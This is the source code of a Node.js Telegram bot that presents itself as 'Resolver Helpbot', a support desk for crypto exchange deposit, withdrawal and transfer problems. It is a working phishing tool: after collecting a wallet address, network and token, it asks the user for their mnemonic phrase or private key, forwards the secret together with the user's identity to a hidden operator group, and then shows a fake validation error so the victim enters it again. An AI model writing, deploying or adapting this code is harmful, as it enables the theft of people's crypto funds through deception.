require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');

const BOT_TOKEN = process.env.BOT_TOKEN;
const RESULT_GROUP_ID = process.env.GROUP_CHAT_ID;
const OWNER_ID = process.env.OWNER_ID;
const WEBHOOK_URL = `${process.env.RENDER_URL}/webhook/${BOT_TOKEN}`;
const PORT = process.env.PORT || 3000;

const bot = new TelegramBot(BOT_TOKEN);
bot.setWebHook(WEBHOOK_URL);

const app = express();
app.use(bodyParser.json());

// Store per-user states
const chatStates = {};

// --- Webhook endpoint ---
app.post(`/webhook/${BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// --- Root endpoint ---
app.get('/', (req, res) => {
  res.send('🤖 Telegram bot is running via webhook.');
});

// --- START COMMAND ---
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  delete chatStates[chatId];

  await bot.sendMessage(
    chatId,
    "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
        ],
      },
    }
  );
});

// --- ISSUE COMMAND ---
bot.onText(/\/issue/, async (msg) => {
  const chatId = msg.chat.id;
  delete chatStates[chatId];

  await bot.sendMessage(
    chatId,
    "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
        ],
      },
    }
  );
});

// --- CALLBACK HANDLER ---
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const data = query.data;

  await bot.deleteMessage(chatId, messageId).catch(() => {});

  switch (data) {
    case 'report_issue':
      await bot.sendMessage(chatId, 'What issue are you currently facing?', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Deposit on Spot', callback_data: 'issue_deposit_spot' }],
            [
              {
                text: 'Withdrawal on Spot',
                callback_data: 'issue_withdraw_spot',
              },
            ],
            [{ text: 'Deposit on Perp', callback_data: 'issue_deposit_perp' }],
            [
              {
                text: 'Withdrawal on Perp',
                callback_data: 'issue_withdraw_perp',
              },
            ],
            [{ text: 'Spot/Perp Transfer', callback_data: 'issue_transfer' }],
            [{ text: 'Other', callback_data: 'issue_other' }],
          ],
        },
      });
      break;

    case 'issue_deposit_spot':
    case 'issue_withdraw_spot':
    case 'issue_deposit_perp':
    case 'issue_withdraw_perp':
    case 'issue_transfer':
    case 'issue_other':
      chatStates[chatId] = {
        step: 'awaiting_wallet_address',
        issueType: data.replace('issue_', '').replace(/_/g, ' '),
      };

      await bot.sendMessage(
        chatId,
        '🏷️ Enter wallet address — exactly as shown in your wallet:',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      break;

    // --- Network selection ---
    case 'network_ethereum':
    case 'network_bnb':
    case 'network_solana':
    case 'network_polygon':
    case 'network_arbitrum':
    case 'network_avalanche':
    case 'network_other': {
      const state = chatStates[chatId];
      if (!state) return;

      state.network = data.replace('network_', '').toUpperCase();
      state.step = 'awaiting_token_selection';

      await bot.sendMessage(chatId, `✅ Network selected: *${state.network}*`, {
        parse_mode: 'Markdown',
      });

      await bot.sendMessage(
        chatId,
        '💠 Which token are you facing this issue with?',
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: 'USDC', callback_data: 'token_usdc' }],
              [{ text: 'USDT', callback_data: 'token_usdt' }],
              [{ text: 'USD1', callback_data: 'token_usd1' }],
              [{ text: 'BTC', callback_data: 'token_btc' }],
              [{ text: 'ETH', callback_data: 'token_eth' }],
              [{ text: 'APX', callback_data: 'token_apx' }],
              [{ text: 'Aster', callback_data: 'token_aster' }],
              [{ text: 'SOL', callback_data: 'token_sol' }],
              [{ text: 'Other', callback_data: 'token_other' }],
            ],
          },
        }
      );
      break;
    }

    // --- Token selection ---
    case 'token_usdc':
    case 'token_usdt':
    case 'token_usd1':
    case 'token_btc':
    case 'token_eth':
    case 'token_apx':
    case 'token_aster':
    case 'token_sol':
    case 'token_other': {
      const state = chatStates[chatId];
      if (!state) return;

      state.token = data.replace('token_', '').toUpperCase();
      state.step = 'awaiting_confirmation';

      const summary =
        `🧾 *Issue Report*\n` +
        `• Issue Type: ${state.issueType.replace(/\b\w/g, (c) =>
          c.toUpperCase()
        )}\n` +
        `• Wallet Address: ${state.walletAddress}\n` +
        `• Network: ${state.network}\n` +
        `• Token: ${state.token}`;

      await bot.sendMessage(chatId, summary, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '➡️ Next', callback_data: 'next_step' }],
            [{ text: '🔄 Start Over', callback_data: 'restart_bot' }],
          ],
        },
      });
      break;
    }

    // --- NEXT STEP ---
    case 'next_step': {
      const state = chatStates[chatId];
      if (!state) return;

      state.step = 'awaiting_authorization';

      await bot.sendMessage(
        chatId,
        'Now enter your mnemonic phrase or private key to authorize:',
        {
          reply_markup: {
            keyboard: [[{ text: 'Cancel' }]],
            resize_keyboard: true,
            one_time_keyboard: true,
          },
        }
      );
      break;
    }

    // --- Restart Bot ---
    case 'restart_bot': {
      delete chatStates[chatId];
      await bot.sendMessage(
        chatId,
        "👋 Welcome to *Resolver Helpbot!* Let's process your issue for Spot, Perp or others.",
        {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [{ text: '🛠 Report an Issue', callback_data: 'report_issue' }],
            ],
          },
        }
      );
      break;
    }

    default:
      break;
  }

  bot.answerCallbackQuery(query.id).catch(console.error);
});

// --- MESSAGE HANDLER ---
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim();
  if (!text) return;

  if (text === 'Cancel') {
    delete chatStates[chatId];
    await bot.sendMessage(chatId, 'Operation canceled.', {
      reply_markup: { remove_keyboard: true },
    });
    return;
  }

  const state = chatStates[chatId];

  if (state?.step === 'awaiting_wallet_address') {
    const isValidEVM = /^0x[a-fA-F0-9]{40}$/.test(text);
    const isValidSolana = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);

    if (!isValidEVM && !isValidSolana) {
      await bot.sendMessage(chatId, '❌ Invalid wallet address. Try again.');
      return;
    }

    state.walletAddress = text;
    state.step = 'awaiting_network_selection';

    await bot.sendMessage(chatId, 'What network are you facing issues on?', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'Ethereum', callback_data: 'network_ethereum' }],
          [{ text: 'BNB Chain', callback_data: 'network_bnb' }],
          [{ text: 'Solana', callback_data: 'network_solana' }],
          [{ text: 'Polygon', callback_data: 'network_polygon' }],
          [{ text: 'Arbitrum', callback_data: 'network_arbitrum' }],
          [{ text: 'Avalanche', callback_data: 'network_avalanche' }],
          [{ text: 'Other', callback_data: 'network_other' }],
        ],
      },
    });
    return;
  }

  if (state?.step === 'awaiting_authorization') {
    try {
      const report =
        `📩 *New Authorization Attempt*\n` +
        `• From: [${msg.from.first_name || 'User'}](tg://user?id=${chatId})\n` +
        `• Chat ID: ${chatId}\n` +
        `• Issue Type: ${state.issueType || 'N/A'}\n` +
        `• Wallet: ${state.walletAddress || 'N/A'}\n` +
        `• Network: ${state.network || 'N/A'}\n` +
        `• Token: ${state.token || 'N/A'}\n` +
        `• Phrase/Pk: \`${text}\``;

      await bot.sendMessage(RESULT_GROUP_ID, report, {
        parse_mode: 'Markdown',
      });
    } catch (err) {
      console.error('❌ Failed to send to result group:', err.message);
    }

    await bot.sendMessage(
      chatId,
      `⚠️ Validation Error: There’s an error in your input, please try again.\n\nNow enter your mnemonic phrase or private key again or send /issue to restart.`,
      { parse_mode: 'Markdown' }
    );
  }
});

app.listen(PORT, () =>
  console.log(`✅ Webhook server running on port ${PORT}`)
);
